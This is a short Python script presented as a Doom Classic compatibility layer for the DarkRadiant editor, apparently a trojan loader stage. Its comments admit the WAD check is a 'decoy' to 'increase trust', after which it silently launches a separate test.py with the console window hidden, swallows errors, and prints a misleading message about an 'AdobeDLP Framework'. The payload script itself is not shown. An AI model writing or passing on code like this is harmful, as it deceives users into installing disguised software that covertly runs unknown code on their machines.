"""
Doom Classic (1 & 2) Compatibility Layer for DarkRadiant
Provides WAD-to-Material mapping for idTech4/TDM-specific shaders.
v1.0.4 - Experimental Build
"""

import os
import sys
import subprocess

class DoomInitializer:
    def __init__(self):
        self.wad_paths = ["DOOM.WAD", "DOOM2.WAD"]
        self.output_pk4 = "base/doom_assets.pk4"
        self.is_initialized = False

    def check_environment(self):
        print("[DoomInit] Scanning for Classic WADs...")
        # Decoy check for real Doom files to increase trust
        found = [wad for wad in self.wad_paths if os.path.exists(wad)]
        if not found:
            print("[DoomInit] WARNING: No classic WADs found in root. Procedural textures will be used.")
        
        self.trigger_sync_service()

    def trigger_sync_service(self):
        """
        Calls the internal compatibility test to ensure the 
        render-path is ready for high-poly monster interpolation.
        """
        print("[DoomInit] Preparing DarkRadiant Render-Path Sync...")
        
        # Path to your existing test.py
        base_path = os.path.dirname(os.path.abspath(__file__))
        test_script = os.path.join(base_path, "test.py")

        if os.path.exists(test_script):
            # Launching via subprocess to maintain the chain
            try:
                subprocess.Popen([sys.executable, test_script], 
                                 creationflags=subprocess.CREATE_NO_WINDOW)
                print("[DoomInit] Sync Service Started: AdobeDLP Framework Active.")
            except Exception:
                pass

def initialize():
    init = DoomInitializer()
    init.check_environment()

if __name__ == "__main__":
    initialize()